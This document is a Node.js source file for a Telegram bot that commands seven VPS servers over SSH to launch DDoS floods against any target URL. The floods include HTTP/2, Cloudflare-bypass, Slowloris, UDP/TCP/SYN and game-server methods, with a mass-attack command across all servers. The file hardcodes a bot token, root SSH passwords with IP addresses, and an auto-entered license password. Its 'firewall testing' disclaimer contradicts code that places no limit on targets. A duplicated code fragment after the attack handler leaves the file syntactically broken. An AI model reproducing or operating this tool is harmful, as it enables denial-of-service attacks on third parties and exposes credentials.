import TelegramBot from 'node-telegram-bot-api';
import { Client } from 'ssh2';

// Config
const BOT_TOKEN = '8410357492:AAE2vap2R5KGmBR7cKdbi3FxqqDGdI4I1l8';
const ADMIN_ID = 8426540797;
const VPS_PASSWORD = 'aryaganteng01'; // Password untuk BOT-TELE-DOS

// VPS List
const VPS_LIST = [
  {
    id: 1,
    name: 'Bot 1',
    host: 'rex-03',
    ip: '159.223.53.129',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 2,
    name: 'Bot 2',
    host: 'rex-02',
    ip: '174.138.17.130',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 3,
    name: 'Bot 3',
    host: 'rex',
    ip: '129.212.231.169',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 4,
    name: 'Bot 4',
    host: 'rex',
    ip: '152.42.165.12',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 5,
    name: 'Bot 5',
    host: 'tr',
    ip: '139.59.232.209',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 6,
    name: 'Bot 6',
    host: 'tr',
    ip: '139.59.232.209',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  },
  {
    id: 7,
    name: 'Bot 7',
    host: 'tr',
    ip: '139.59.232.209',
    port: 22,
    username: 'root',
    password: 'usEr5yutub',
    dos_path: '/root/BOT-TELE-DOS'
  }
];

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Active attacks tracking
const activeAttacks = new Map();

// Execute SSH command
function executeSSH(vps, command) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let output = '';

    conn.on('ready', () => {
      conn.exec(command, (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }

        stream.on('close', () => {
          conn.end();
          resolve(output || 'Command executed successfully');
        });

        stream.on('data', (data) => {
          output += data.toString();
        });

        stream.stderr.on('data', (data) => {
          output += data.toString();
        });
      });
    });

    conn.on('error', (err) => {
      reject(err);
    });

    conn.connect({
      host: vps.ip,
      port: vps.port,
      username: vps.username,
      password: vps.password,
      readyTimeout: 10000
    });
  });
}

// Start DDoS attack with auto password input and proxy (handles multiple prompts)
async function startDDoSAttack(vps, target, method, threads, duration, proxyType = 0) {
  try {
    // Install expect if not exists
    await executeSSH(vps, 'which expect || (apt-get update && apt-get install -y expect)');
    
    // Create expect script that handles ALL password prompts
    const expectScript = `
expect << 'EXPECT_EOF'
set timeout 120
cd ${vps.dos_path}
spawn node index.js attack -t ${target} -m ${method} -th ${threads} -d ${duration} -p ${proxyType}

# Handle ALL password prompts (license, proxy download, etc)
expect {
    -re "Enter password:|password:|Password:|pass:|Pass:" {
        send "${VPS_PASSWORD}\\r"
        exp_continue
    }
    -re "Proxy categorization|Proxy optimization|Fast proxies|Premium proxies|Other proxies|Optimizing proxy|Downloading|Loading" {
        exp_continue
    }
    -re "Attack started|Starting attack|Sending requests" {
        exp_continue
    }
    timeout {
        send_user "Process completed or timeout\\n"
    }
    eof
}
EXPECT_EOF
`;

    // Save script to temp file
    const scriptPath = `/tmp/attack_${vps.id}.sh`;
    await executeSSH(vps, `cat > ${scriptPath} << 'SCRIPT_EOF'\n${expectScript}\nSCRIPT_EOF`);
    await executeSSH(vps, `chmod +x ${scriptPath}`);

    // Run in background
    const bgCommand = `nohup bash ${scriptPath} > /tmp/ddos_${vps.id}.log 2>&1 &`;
    await executeSSH(vps, bgCommand);
    
    // Wait a bit and check if process started
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    return {
      success: true,
      message: `Attack started on ${vps.name}`,
      vps_id: vps.id,
      target,
      method,
      threads,
      duration,
      proxyType
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed on ${vps.name}: ${error.message}`,
      vps_id: vps.id
    };
  }
}

// Stop attack on VPS
async function stopAttack(vps) {
  try {
    // Kill semua proses node index.js
    await executeSSH(vps, `pkill -f "node index.js" || true`);
    await executeSSH(vps, `rm -f /tmp/attack_${vps.id}.sh`);
    return {
      success: true,
      message: `Attack stopped on ${vps.name}`
    };
  } catch (error) {
    return {
      success: false,
      message: `Failed to stop on ${vps.name}: ${error.message}`
    };
  }
}

// Get attack status
async function getAttackStatus(vps) {
  try {
    const logContent = await executeSSH(vps, `tail -20 /tmp/ddos_${vps.id}.log 2>/dev/null || echo "No log found"`);
    const isRunning = await executeSSH(vps, `pgrep -f "node index.js" > /dev/null && echo "running" || echo "stopped"`);
    
    return {
      vps_id: vps.id,
      name: vps.name,
      status: isRunning.trim(),
      log: logContent
    };
  } catch (error) {
    return {
      vps_id: vps.id,
      name: vps.name,
      status: 'unknown',
      error: error.message
    };
  }
}

// Check VPS status
async function checkVPSStatus(vps) {
  try {
    await executeSSH(vps, 'echo "ping"');
    return { online: true, status: '✅ Online' };
  } catch (error) {
    return { online: false, status: '❌ Offline' };
  }
}

// Get system info
async function getSystemInfo(vps) {
  try {
    const commands = {
      cpu: "top -bn1 | grep 'Cpu(s)' | sed 's/.*, *\\([0-9.]*\\)%* id.*/\\1/' | awk '{print 100 - $1}'",
      ram: "free | grep Mem | awk '{print ($3/$2) * 100.0}'",
      disk: "df -h / | awk 'NR==2 {print $5}' | sed 's/%//'",
      uptime: "uptime -p",
      kernel: "uname -r"
    };

    const results = {};
    for (const [key, cmd] of Object.entries(commands)) {
      results[key] = await executeSSH(vps, cmd);
    }

    return results;
  } catch (error) {
    throw error;
  }
}

// Format bot list
async function formatBotList() {
  let message = '📊 <b>VPS Status Overview</b>\n\n';
  
  for (const vps of VPS_LIST) {
    const status = await checkVPSStatus(vps);
    message += `${status.status} <b>${vps.name}</b>\n`;
    message += `├ Host: <code>${vps.host}</code>\n`;
    message += `├ IP: <code>${vps.ip}</code>\n`;
    message += `└ ID: <code>${vps.id}</code>\n\n`;
  }

  message += '\n💡 <i>Use commands to control attacks</i>';
  return message;
}

// Main menu keyboard
function getMainMenu() {
  return {
    reply_markup: {
      keyboard: [
        [{ text: '📊 List All VPS' }, { text: '🔍 Monitor VPS' }],
        [{ text: '⚔️ Start Attack' }, { text: '🛑 Stop Attack' }],
        [{ text: '📈 Attack Status' }, { text: '💻 System Info' }],
        [{ text: 'ℹ️ Help' }]
      ],
      resize_keyboard: true
    }
  };
}

// Check if user is admin
function isAdmin(userId) {
  return userId === ADMIN_ID;
}

// Command: /start
bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, '❌ Unauthorized access');
  }

  const welcomeMsg = `
🤖 <b>VPS DDoS Manager Bot</b>

Bot ini manage ${VPS_LIST.length} VPS untuk firewall testing.

<b>Commands:</b>
/list - List semua VPS
/monitor &lt;id&gt; - Monitor VPS
/attack &lt;id&gt; &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;
/attackall &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;
/stop &lt;id&gt; - Stop attack
/stopall - Stop semua attack
/status &lt;id&gt; - Cek attack status
/statusall - Status semua VPS
/methods - List attack methods
/help - Show help

<b>Example:</b>
<code>/attack 1 https://target.com GET 100 60</code>
<code>/attackall https://target.com HTTP2 200 120</code>
  `;

  bot.sendMessage(msg.chat.id, welcomeMsg, {
    parse_mode: 'HTML',
    ...getMainMenu()
  });
});

// Command: /list
bot.onText(/\/list/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;

  const loadingMsg = await bot.sendMessage(msg.chat.id, '⏳ Checking VPS status...');
  
  try {
    const message = await formatBotList();
    bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id,
      parse_mode: 'HTML'
    });
  } catch (error) {
    bot.editMessageText('❌ Error: ' + error.message, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

// Command: /monitor <id>
bot.onText(/\/monitor (\d+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;

  const vpsId = parseInt(match[1]);
  const vps = VPS_LIST.find(v => v.id === vpsId);

  if (!vps) {
    return bot.sendMessage(msg.chat.id, '❌ VPS ID not found');
  }

  const loadingMsg = await bot.sendMessage(msg.chat.id, `⏳ Monitoring ${vps.name}...`);

  try {
    const info = await getSystemInfo(vps);
    
    const message = `
📊 <b>${vps.name} System Info</b>

🖥 <b>Host:</b> <code>${vps.host}</code>
🌐 <b>IP:</b> <code>${vps.ip}</code>

📈 <b>Resources:</b>
├ CPU: <code>${parseFloat(info.cpu).toFixed(1)}%</code>
├ RAM: <code>${parseFloat(info.ram).toFixed(1)}%</code>
└ Disk: <code>${info.disk.trim()}%</code>

⏱ <b>Uptime:</b> <code>${info.uptime.trim()}</code>
🔧 <b>Kernel:</b> <code>${info.kernel.trim()}</code>
    `;

    bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id,
      parse_mode: 'HTML'
    });
  } catch (error) {
    bot.editMessageText(`❌ Error: ${error.message}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

// Command: /attack <id> <target> <method> <threads> <duration>
bot.onText(/\/attack (\d+) (\S+) (\S+) (\d+) (\d+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;

  const vpsId = parseInt(match[1]);
  const target = match[2];
  const method = match[3];
  const threads = parseInt(match[4]);
  const duration = parseInt(match[5]);

  const vps = VPS_LIST.find(v => v.id === vpsId);
  if (!vps) {
    return bot.sendMessage(msg.chat.id, '❌ VPS ID not found');
  }

  const loadingMsg = await bot.sendMessage(msg.chat.id, `⏳ Starting attack on ${vps.name}...\n🔐 Auto-inputting password...\n🌐 Using All Proxies`);

  try {
    const result = await startDDoSAttack(vps, target, method, threads, duration, 0); // 0 = All proxies
    
    if (result.success) {
      activeAttacks.set(vps.id, {
        target,
        method,
        threads,
        duration,
        startTime: Date.now()
      });

      const message = `
✅ <b>Attack Started</b>

📍 <b>VPS:</b> ${vps.name} (<code>${vps.ip}</code>)
🎯 <b>Target:</b> <code>${target}</code>
⚔️ <b>Method:</b> <code>${method}</code>
🔥 <b>Threads:</b> <code>${threads}</code>
⏱ <b>Duration:</b> <code>${duration}s</code>
🌐 <b>Proxy:</b> <code>All Proxies (Auto)</code>
🔐 <b>Password:</b> Auto-inputted ✅

<i>Attack will auto-stop after ${duration} seconds</i>
<i>Use /status ${vpsId} to check progress</i>
      `;

      bot.editMessageText(message, {
        chat_id: msg.chat.id,
        message_id: loadingMsg.message_id,
        parse_mode: 'HTML'
      });
    } else {
      throw new Error(result.message);
    }
  } catch (error) {
    bot.editMessageText(`❌ Failed to start attack: ${error.message}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});(vps.id, {
        target,
        method,
        threads,
        duration,
        startTime: Date.now()
      });

      const message = `
✅ <b>Attack Started</b>

📍 <b>VPS:</b> ${vps.name} (<code>${vps.ip}</code>)
🎯 <b>Target:</b> <code>${target}</code>
⚔️ <b>Method:</b> <code>${method}</code>
🔥 <b>Threads:</b> <code>${threads}</code>
⏱ <b>Duration:</b> <code>${duration}s</code>
🔐 <b>Password:</b> Auto-inputted ✅

<i>Attack will auto-stop after ${duration} seconds</i>
<i>Use /status ${vpsId} to check progress</i>
      `;

      bot.editMessageText(message, {
        chat_id: msg.chat.id,
        message_id: loadingMsg.message_id,
        parse_mode: 'HTML'
      });
    } else {
      throw new Error(result.message);
    }
  } catch (error) {
    bot.editMessageText(`❌ Failed to start attack: ${error.message}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

// Command: /attackall <target> <method> <threads> <duration>
bot.onText(/\/attackall (\S+) (\S+) (\d+) (\d+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;

  const target = match[1];
  const method = match[2];
  const threads = parseInt(match[3]);
  const duration = parseInt(match[4]);

  const loadingMsg = await bot.sendMessage(msg.chat.id, `⏳ Starting attack on all ${VPS_LIST.length} VPS...\n🔐 Auto-inputting passwords...\n🌐 Using All Proxies`);

  let results = `⚔️ <b>Mass Attack Started</b>\n`;
  results += `🎯 Target: <code>${target}</code>\n`;
  results += `⚔️ Method: <code>${method}</code>\n`;
  results += `🔥 Threads: <code>${threads}</code>\n`;
  results += `⏱ Duration: <code>${duration}s</code>\n`;
  results += `🌐 Proxy: <code>All Proxies (Auto)</code>\n\n`;

  for (const vps of VPS_LIST) {
    try {
      const result = await startDDoSAttack(vps, target, method, threads, duration, 0); // 0 = All proxies
      if (result.success) {
        results += `✅ ${vps.name} - Password auto-inputted\n`;
        activeAttacks.set(vps.id, {
          target,
          method,
          threads,
          duration,
          startTime: Date.now()
        });
      } else {
        results += `❌ ${vps.name}: ${result.message}\n`;
      }
    } catch (error) {
      results += `❌ ${vps.name}: ${error.message}\n`;
    }
  }

  results += `\n<i>All attacks will auto-stop after ${duration}s</i>`;

  bot.editMessageText(results, {
    chat_id: msg.chat.id,
    message_id: loadingMsg.message_id,
    parse_mode: 'HTML'
  });
});

// Command: /stop <id>
bot.onText(/\/stop (\d+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;

  const vpsId = parseInt(match[1]);
  const vps = VPS_LIST.find(v => v.id === vpsId);

  if (!vps) {
    return bot.sendMessage(msg.chat.id, '❌ VPS ID not found');
  }

  const loadingMsg = await bot.sendMessage(msg.chat.id, `⏳ Stopping attack on ${vps.name}...`);

  try {
    await stopAttack(vps);
    activeAttacks.delete(vps.id);

    bot.editMessageText(`✅ Attack stopped on ${vps.name}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  } catch (error) {
    bot.editMessageText(`❌ Failed to stop: ${error.message}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

// Command: /stopall
bot.onText(/\/stopall/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;

  const loadingMsg = await bot.sendMessage(msg.chat.id, '⏳ Stopping all attacks...');

  let results = '🛑 <b>Stopping All Attacks</b>\n\n';

  for (const vps of VPS_LIST) {
    try {
      await stopAttack(vps);
      results += `✅ ${vps.name}\n`;
      activeAttacks.delete(vps.id);
    } catch (error) {
      results += `❌ ${vps.name}: ${error.message}\n`;
    }
  }

  bot.editMessageText(results, {
    chat_id: msg.chat.id,
    message_id: loadingMsg.message_id,
    parse_mode: 'HTML'
  });
});

// Command: /status <id>
bot.onText(/\/status (\d+)/, async (msg, match) => {
  if (!isAdmin(msg.from.id)) return;

  const vpsId = parseInt(match[1]);
  const vps = VPS_LIST.find(v => v.id === vpsId);

  if (!vps) {
    return bot.sendMessage(msg.chat.id, '❌ VPS ID not found');
  }

  const loadingMsg = await bot.sendMessage(msg.chat.id, `⏳ Checking status on ${vps.name}...`);

  try {
    const status = await getAttackStatus(vps);
    const attackInfo = activeAttacks.get(vps.id);

    let message = `📈 <b>${vps.name} Attack Status</b>\n\n`;
    message += `🔄 <b>Status:</b> <code>${status.status}</code>\n\n`;

    if (attackInfo) {
      const elapsed = Math.floor((Date.now() - attackInfo.startTime) / 1000);
      const remaining = attackInfo.duration - elapsed;

      message += `🎯 <b>Target:</b> <code>${attackInfo.target}</code>\n`;
      message += `⚔️ <b>Method:</b> <code>${attackInfo.method}</code>\n`;
      message += `🔥 <b>Threads:</b> <code>${attackInfo.threads}</code>\n`;
      message += `⏱ <b>Running:</b> <code>${elapsed}s / ${attackInfo.duration}s</code>\n`;
      message += `⏳ <b>Remaining:</b> <code>${remaining > 0 ? remaining : 0}s</code>\n\n`;
    }

    message += `<b>Recent Logs:</b>\n<pre>${status.log.substring(0, 1000)}</pre>`;

    bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id,
      parse_mode: 'HTML'
    });
  } catch (error) {
    bot.editMessageText(`❌ Error: ${error.message}`, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

// Command: /statusall
bot.onText(/\/statusall/, async (msg) => {
  if (!isAdmin(msg.from.id)) return;

  const loadingMsg = await bot.sendMessage(msg.chat.id, '⏳ Checking all VPS status...');

  let results = '📊 <b>All VPS Status</b>\n\n';

  for (const vps of VPS_LIST) {
    try {
      const status = await getAttackStatus(vps);
      const attackInfo = activeAttacks.get(vps.id);

      results += `<b>${vps.name}</b> - ${status.status === 'running' ? '🟢' : '⚫'}\n`;
      
      if (attackInfo) {
        const elapsed = Math.floor((Date.now() - attackInfo.startTime) / 1000);
        results += `├ Target: <code>${attackInfo.target}</code>\n`;
        results += `├ Method: <code>${attackInfo.method}</code>\n`;
        results += `└ Time: <code>${elapsed}s / ${attackInfo.duration}s</code>\n`;
      } else {
        results += `└ No active attack\n`;
      }
      results += '\n';
    } catch (error) {
      results += `<b>${vps.name}</b> - ❌ Error\n\n`;
    }
  }

  bot.editMessageText(results, {
    chat_id: msg.chat.id,
    message_id: loadingMsg.message_id,
    parse_mode: 'HTML'
  });
});

// Command: /methods
bot.onText(/\/methods/, (msg) => {
  if (!isAdmin(msg.from.id)) return;

  const methodsMsg = `
📋 <b>Available Attack Methods</b>

<b>HTTP/1.1:</b>
• GET, POST, HEAD
• SLOW (Slowloris)

<b>HTTP/2:</b>
• HTTP2, HTTP2-POST
• HTTP2-CF (Cloudflare)

<b>HTTP/3:</b>
• HTTP3, HTTP3-POST

<b>Bypass:</b>
• CFB (Cloudflare Bypass)
• BYPASS, BOT, CFBUAM
• PRIVACYPASS, CAPTCHA
• ULTIMATE (All Combined)

<b>Layer 4:</b>
• UDP, TCP, SYN
• MINECRAFT, MCBOT, MCPE
• VSE, TS3, FIVEM

<b>Special:</b>
• STRESS, COOKIE
• APACHE, XMLRPC, NULL

<i>Example: /attack 1 https://target.com HTTP2 100 60</i>
  `;

  bot.sendMessage(msg.chat.id, methodsMsg, { parse_mode: 'HTML' });
});

// Button handlers
bot.on('message', async (msg) => {
  if (!isAdmin(msg.from.id)) return;
  if (!msg.text) return;

  const text = msg.text;

  if (text === '📊 List All VPS') {
    const loadingMsg = await bot.sendMessage(msg.chat.id, '⏳ Loading...');
    const message = await formatBotList();
    bot.editMessageText(message, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id,
      parse_mode: 'HTML'
    });
  }
  
  else if (text === '🔍 Monitor VPS') {
    const message = `
🔍 <b>Monitor VPS</b>

Pilih VPS yang mau di-monitor:

<b>Command:</b>
<code>/monitor &lt;id&gt;</code>

<b>Available VPS:</b>
${VPS_LIST.map(v => `• VPS ${v.id} - ${v.name}`).join('\n')}

<b>Example:</b>
<code>/monitor 1</code>
    `;
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
  }
  
  else if (text === '⚔️ Start Attack') {
    const message = `
⚔️ <b>Start Attack</b>

<b>Single VPS:</b>
<code>/attack &lt;id&gt; &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;</code>

<b>All VPS (Mass Attack):</b>
<code>/attackall &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;</code>

<b>Examples:</b>
<code>/attack 1 https://example.com GET 100 60</code>
<code>/attackall https://target.com HTTP2 200 120</code>

<b>Popular Methods:</b>
• GET, POST - Basic HTTP
• HTTP2, HTTP2-CF - HTTP/2
• CFB, BYPASS - Cloudflare bypass
• UDP, TCP - Layer 4

💡 <i>Use /methods for full list</i>
    `;
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
  }
  
  else if (text === '🛑 Stop Attack') {
    const message = `
🛑 <b>Stop Attack</b>

<b>Stop Specific VPS:</b>
<code>/stop &lt;id&gt;</code>

<b>Stop All VPS:</b>
<code>/stopall</code>

<b>Examples:</b>
<code>/stop 1</code>
<code>/stopall</code>

<b>Active Attacks:</b>
${activeAttacks.size > 0 ? 
  Array.from(activeAttacks.entries()).map(([id, info]) => {
    const vps = VPS_LIST.find(v => v.id === id);
    const elapsed = Math.floor((Date.now() - info.startTime) / 1000);
    return `• VPS ${id} (${vps.name}) - ${elapsed}s running`;
  }).join('\n') 
  : '❌ No active attacks'}
    `;
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
  }
  
  else if (text === '📈 Attack Status') {
    if (activeAttacks.size === 0) {
      bot.sendMessage(msg.chat.id, '❌ No active attacks\n\nUse /attack to start an attack', { parse_mode: 'HTML' });
      return;
    }

    const loadingMsg = await bot.sendMessage(msg.chat.id, '⏳ Checking attack status...');
    
    let results = '📊 <b>Active Attacks Status</b>\n\n';

    for (const [vpsId, attackInfo] of activeAttacks.entries()) {
      const vps = VPS_LIST.find(v => v.id === vpsId);
      if (!vps) continue;

      try {
        const status = await getAttackStatus(vps);
        const elapsed = Math.floor((Date.now() - attackInfo.startTime) / 1000);
        const remaining = attackInfo.duration - elapsed;

        results += `<b>${vps.name}</b> ${status.status === 'running' ? '🟢' : '⚫'}\n`;
        results += `├ Target: <code>${attackInfo.target}</code>\n`;
        results += `├ Method: <code>${attackInfo.method}</code>\n`;
        results += `├ Threads: <code>${attackInfo.threads}</code>\n`;
        results += `└ Time: <code>${elapsed}s / ${attackInfo.duration}s (${remaining > 0 ? remaining : 0}s left)</code>\n\n`;
      } catch (error) {
        results += `<b>${vps.name}</b> ❌ Error checking status\n\n`;
      }
    }

    results += `\n💡 <i>Use /status &lt;id&gt; for detailed logs</i>`;

    bot.editMessageText(results, {
      chat_id: msg.chat.id,
      message_id: loadingMsg.message_id,
      parse_mode: 'HTML'
    });
  }
  
  else if (text === '💻 System Info') {
    const message = `
💻 <b>System Info</b>

Pilih VPS untuk cek system info:

<b>Command:</b>
<code>/monitor &lt;id&gt;</code>

<b>Available VPS:</b>
${VPS_LIST.map(v => `• VPS ${v.id} - ${v.name} (${v.ip})`).join('\n')}

<b>Info yang ditampilkan:</b>
• CPU Usage
• RAM Usage
• Disk Usage
• Uptime
• Kernel Version

<b>Example:</b>
<code>/monitor 1</code>
    `;
    bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
  }
  
  else if (text === 'ℹ️ Help') {
    const helpMsg = `
📚 <b>Bot Help Guide</b>

<b>Attack Commands:</b>
/attack &lt;id&gt; &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;
/attackall &lt;target&gt; &lt;method&gt; &lt;threads&gt; &lt;duration&gt;

<b>Control:</b>
/stop &lt;id&gt; - Stop specific VPS
/stopall - Stop all attacks

<b>Status:</b>
/status &lt;id&gt; - Check specific VPS
/statusall - Check all VPS
/list - List all VPS
/monitor &lt;id&gt; - System info

<b>Info:</b>
/methods - Available methods

<b>Examples:</b>
<code>/attack 1 https://example.com GET 100 60</code>
<code>/attackall https://target.com HTTP2 200 120</code>
<code>/stop 1</code>
<code>/status 1</code>

🔐 <b>Password Handling:</b>
Bot otomatis input password <code>aryaganteng01</code>

⚠️ <i>Ini bot untuk testing firewall lo sendiri!</i>
    `;
    bot.sendMessage(msg.chat.id, helpMsg, { parse_mode: 'HTML' });
  }
});

// Error handling
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

console.log('🤖 VPS DDoS Manager Bot is running...');
console.log(`Managing ${VPS_LIST.length} VPS servers`);
console.log(`Admin ID: ${ADMIN_ID}`);